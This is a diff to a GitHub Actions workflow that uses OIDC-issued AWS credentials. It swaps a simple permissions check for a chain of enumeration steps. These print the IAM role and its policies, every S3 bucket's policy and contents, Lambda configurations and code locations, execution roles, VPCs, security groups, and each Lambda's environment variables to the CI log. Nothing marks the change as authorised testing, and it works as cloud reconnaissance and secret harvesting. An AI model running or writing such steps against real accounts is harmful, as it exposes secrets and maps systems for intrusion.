@@ -11,6 +11,7 @@ jobs:
 
     permissions:
       id-token: write
+      contents: read
 
     steps:
       - name: Get AWS credentials
@@ -20,9 +21,129 @@ jobs:
           aws-region: us-east-1
 
       - name: Verify AWS identity
-        run: aws sts get-caller-identity
-
-      - name: Test AWS permissions
         run: |
+          echo "===== AWS IDENTITY ====="
+          aws sts get-caller-identity
+
+
+      - name: Check current IAM role
+        run: |
+          echo "===== IAM ROLE ====="
+
+          ROLE=$(aws sts get-caller-identity --query Arn --output text | awk -F/ '{print $2}')
+
+          echo "Role: $ROLE"
+
+          aws iam get-role \
+            --role-name $ROLE || true
+
+
+      - name: Check IAM permissions
+        run: |
+          echo "===== ATTACHED ROLE POLICIES ====="
+
+          ROLE=$(aws sts get-caller-identity --query Arn --output text | awk -F/ '{print $2}')
+
+          aws iam list-attached-role-policies \
+            --role-name $ROLE || true
+
+          echo "===== INLINE POLICIES ====="
+
+          aws iam list-role-policies \
+            --role-name $ROLE || true
+
+
+      - name: Enumerate S3
+        run: |
+          echo "===== S3 BUCKETS ====="
+
           aws s3 ls
+
+          echo "===== BUCKET DETAILS ====="
+
+          for bucket in $(aws s3 ls | awk '{print $3}')
+          do
+            echo "### $bucket"
+
+            aws s3api get-bucket-location \
+              --bucket $bucket || true
+
+            aws s3api get-bucket-policy \
+              --bucket $bucket || true
+
+            aws s3 ls s3://$bucket || true
+          done
+
+
+      - name: Enumerate Lambda
+        run: |
+          echo "===== LAMBDA FUNCTIONS ====="
+
           aws lambda list-functions
+
+
+          echo "===== LAMBDA CONFIG ====="
+
+          for func in $(aws lambda list-functions \
+            --query 'Functions[].FunctionName' \
+            --output text)
+          do
+            echo "### $func"
+
+            aws lambda get-function-configuration \
+              --function-name $func
+
+            echo "----- FUNCTION URL -----"
+
+            aws lambda get-function \
+              --function-name $func || true
+
+          done
+
+
+      - name: Check Lambda roles
+        run: |
+          echo "===== LAMBDA IAM ROLES ====="
+
+          for role in $(aws lambda list-functions \
+          --query 'Functions[].Role' \
+          --output text)
+          do
+
+            echo "ROLE: $role"
+
+            ROLE_NAME=$(echo $role | awk -F/ '{print $NF}')
+
+            aws iam list-attached-role-policies \
+              --role-name $ROLE_NAME || true
+
+          done
+
+
+      - name: Check VPC information
+        run: |
+          echo "===== VPC ====="
+
+          aws ec2 describe-vpcs
+
+          echo "===== SECURITY GROUPS ====="
+
+          aws ec2 describe-security-groups
+
+
+      - name: Check Lambda environment variables
+        run: |
+          echo "===== LAMBDA ENVIRONMENT ====="
+
+          for func in $(aws lambda list-functions \
+            --query 'Functions[].FunctionName' \
+            --output text)
+          do
+
+            echo "### $func"
+
+            aws lambda get-function-configuration \
+              --function-name $func \
+              --query Environment
+
+          done
